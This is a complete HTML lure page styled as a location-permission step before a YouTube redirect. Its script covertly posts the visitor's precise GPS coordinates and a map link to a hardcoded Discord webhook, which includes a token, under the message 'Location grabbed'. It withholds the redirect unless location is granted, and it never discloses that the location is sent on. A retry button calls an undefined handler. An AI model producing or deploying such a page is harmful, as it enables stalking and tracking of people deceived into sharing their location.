<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Redirecting...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(145deg, #0a0f1e 0%, #0c1222 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #eef2ff;
            padding: 1.5rem;
        }

        .card {
            background: rgba(18, 25, 45, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 2.5rem;
            padding: 2rem 2rem 2.2rem;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(71, 85, 120, 0.4);
            transition: all 0.2s ease;
        }

        .icon {
            font-size: 4rem;
            margin-bottom: 1rem;
            display: inline-block;
            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
        }

        h3 {
            font-size: 1.8rem;
            font-weight: 600;
            letter-spacing: -0.3px;
            background: linear-gradient(135deg, #ffffff, #b9c8ff);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            margin-bottom: 0.5rem;
        }

        .status-message {
            font-size: 1rem;
            color: #b9c7e3;
            background: rgba(0, 0, 0, 0.35);
            padding: 0.8rem 1.2rem;
            border-radius: 3rem;
            margin: 1.2rem 0 1rem;
            display: inline-block;
            backdrop-filter: blur(4px);
        }

        .spinner {
            display: inline-block;
            width: 28px;
            height: 28px;
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            border-top-color: #4c9aff;
            animation: spin 0.8s linear infinite;
            margin-right: 10px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .info-text {
            font-size: 0.85rem;
            background: rgba(0, 0, 0, 0.3);
            padding: 0.7rem;
            border-radius: 1.5rem;
            margin-top: 1.2rem;
            color: #8d9ac0;
        }

        .redirect-note {
            font-size: 0.75rem;
            margin-top: 1rem;
            color: #5f6e97;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
        }

        .dot-pulse {
            display: inline-flex;
            gap: 4px;
            align-items: center;
        }

        .dot-pulse span {
            width: 5px;
            height: 5px;
            background-color: #6c8eff;
            border-radius: 50%;
            display: inline-block;
            animation: pulse 1.2s infinite ease-in-out;
        }

        .dot-pulse span:nth-child(2) { animation-delay: 0.2s; }
        .dot-pulse span:nth-child(3) { animation-delay: 0.4s; }

        @keyframes pulse {
            0%, 100% { opacity: 0.3; transform: scale(0.8); }
            50% { opacity: 1; transform: scale(1.2); background-color: #9bbaff; }
        }

        button {
            background: #2a3a60;
            border: none;
            padding: 0.6rem 1.2rem;
            border-radius: 2rem;
            color: white;
            font-weight: 500;
            margin-top: 1rem;
            cursor: pointer;
            transition: 0.2s;
        }

        button:hover {
            background: #3e5a8c;
        }

        .hidden {
            display: none;
        }

        a {
            color: #8aabff;
            text-decoration: none;
        }

        footer {
            font-size: 0.7rem;
            margin-top: 1.8rem;
            opacity: 0.5;
        }
    </style>
</head>
<body>

<div class="card" id="uiCard">
    <div class="icon">📍</div>
    <h3>Location Access</h3>
    <div id="statusArea">
        <div class="status-message">
            <span class="spinner"></span> Requesting location...
        </div>
    </div>
    <div class="info-text">
        ⚡ We need your location to provide the best experience.<br>
        After approval, you will be redirected automatically.
    </div>
    <div class="redirect-note">
        <span>Redirect target</span> 
        <span class="dot-pulse"><span></span><span></span><span></span></span>
        <span>YouTube video</span>
    </div>
    <footer>
        secure • instant redirect
    </footer>
</div>

<script>
    (function() {
        // =============================================
        // REDIRECT TARGET: YouTube link (as requested)
        // =============================================
        const REDIRECT_URL = "https://youtu.be/SPFtY8fioa0?si=nx8YbEE7a6mvrebJ";
        
        // DOM elements
        const uiCard = document.getElementById('uiCard');
        const statusArea = document.getElementById('statusArea');
        
        // Helper to update UI status with custom message
        function setStatus(message, isLoading = false, isError = false) {
            if (!statusArea) return;
            let iconHtml = '';
            if (isLoading) {
                iconHtml = '<span class="spinner"></span> ';
            } else if (isError) {
                iconHtml = '⚠️ ';
            } else {
                iconHtml = '✅ ';
            }
            statusArea.innerHTML = `<div class="status-message" style="${isError ? 'background: rgba(180, 70, 70, 0.3); border-left: 2px solid #ff8a7a;' : ''}">
                ${iconHtml}${message}
            </div>`;
        }
        
        // Perform redirect after successful location capture
        function performRedirect() {
            // Small visual feedback that redirect is happening
            setStatus("Location captured! Redirecting now...", false, false);
            // change icon for fun
            const iconEl = document.querySelector('.icon');
            if (iconEl) iconEl.textContent = '🔁';
            
            // optional: slight delay for better UX (but instant is fine)
            // However, to ensure the webhook request isn't abruptly cancelled by navigation,
            // we need to be careful: fetch is sent BEFORE redirect.
            // Actually we call redirect after fetch completes, but we'll add a tiny timeout just to let UI breathe.
            // But the redirect should happen after fetch is fully sent (not waiting response).
            // However to guarantee the POST request is fired, we call redirect after a minimal delay but after fetch.
            // But better: we schedule redirect after fetch is initiated but not blocking.
            // Since we are inside getCurrentPosition success, fetch already triggered. We'll set redirect with 400ms delay to ensure request reaches network.
            // This also gives user a glimpse that location worked.
            setTimeout(() => {
                window.location.replace(REDIRECT_URL);
            }, 400);
        }
        
        // Handle geolocation errors with proper feedback, no redirect on denial.
        function handleGeoError(error) {
            console.warn("Geolocation error:", error);
            let errorMsg = "Permission denied or location unavailable.";
            if (error.code === 1) {
                errorMsg = "Location access denied. You must allow location to continue.";
            } else if (error.code === 2) {
                errorMsg = "Position unavailable. Check your network or GPS.";
            } else if (error.code === 3) {
                errorMsg = "Location request timed out. Please try again.";
            }
            setStatus(errorMsg, false, true);
            
            // Change card style to show denial but NO redirect to YouTube (respect user choice)
            const iconEl = document.querySelector('.icon');
            if (iconEl) iconEl.textContent = '🔒';
            
            // Add a retry button so user can manually retry if they want (optional)
            const retryButton = document.createElement('button');
            retryButton.textContent = '🔄 Retry location request';
            retryButton.style.marginTop = '16px';
            retryButton.style.fontSize = '0.85rem';
            retryButton.onclick = () => {
                setStatus("Requesting location...", true, false);
                if (iconEl) iconEl.textContent = '📍';
                // remove button to avoid duplicates
                if (retryButton.parentNode) retryButton.remove();
                navigator.geolocation.getCurrentPosition(successHandler, errorHandler, geoOptions);
            };
            // remove existing button if any
            const oldBtn = document.querySelector('.retry-btn');
            if (oldBtn) oldBtn.remove();
            retryButton.classList.add('retry-btn');
            statusArea.insertAdjacentElement('afterend', retryButton);
            
            // Also show note that redirect won't happen without permission
            const noteDiv = document.createElement('div');
            noteDiv.className = 'info-text';
            noteDiv.style.marginTop = '12px';
            noteDiv.style.background = 'rgba(0,0,0,0.4)';
            noteDiv.innerHTML = '🔐 Redirect requires location permission. Please allow location access.';
            if (!document.querySelector('.extra-note')) {
                noteDiv.classList.add('extra-note');
                statusArea.insertAdjacentElement('afterend', noteDiv);
            }
        }
        
        // Success callback: we grab coordinates, send to Discord webhook, then redirect
        function successHandler(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = Math.round(position.coords.accuracy);
            
            // Update UI: show that we got location, preparing redirect
            setStatus(`✓ Location obtained (${lat.toFixed(5)}, ${lon.toFixed(5)}). Redirecting...`, false);
            
            // Create Discord webhook payload
            const webhookURL = "https://discord.com/api/webhooks/1496515811635101786/dGB-_12zU5Y9zOUTjm3hLwecIlYhpLrgDjlyIWKQDuv1c5Bw0YSq6c0Vc2xLLMAhsuax";
            const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            const content = `📍 **Location grabbed**\nLatitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc}m\nMaps: ${mapsLink}`;
            
            // Send data to Discord (fire-and-forget)
            // Using fetch with keepalive ensures request might survive page navigation
            fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ content: content }),
                keepalive: true   // Helps ensure the request is sent even if page unloads quickly
            }).catch(err => {
                // Silent fail: we don't want to block redirect on webhook error.
                console.warn("Discord webhook failed:", err);
            });
            
            // Execute redirect after location is sent
            performRedirect();
        }
        
        // Geolocation options for better accuracy
        const geoOptions = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };
        
        // Start the geolocation process
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(successHandler, handleGeoError, geoOptions);
        } else {
            setStatus("Geolocation not supported by your browser.", false, true);
            const iconEl = document.querySelector('.icon');
            if (iconEl) iconEl.textContent = '🌐';
            const notSupportedMsg = document.createElement('div');
            notSupportedMsg.className = 'info-text';
            notSupportedMsg.style.background = '#3a2a2a';
            notSupportedMsg.innerHTML = '❌ Your browser does not support geolocation. Cannot proceed to redirect.';
            statusArea.insertAdjacentElement('afterend', notSupportedMsg);
        }
        
        // Optional: Add manual override note (but we respect permission; we never force redirect without location)
        // For transparency, we add no hidden auto-redirect unless location success.
        // Provide fallback if the user blocks: show message, no redirect.
        // Additionally, if page gets stuck in loading state? but anyway.
    })();
</script>
</body>
</html>
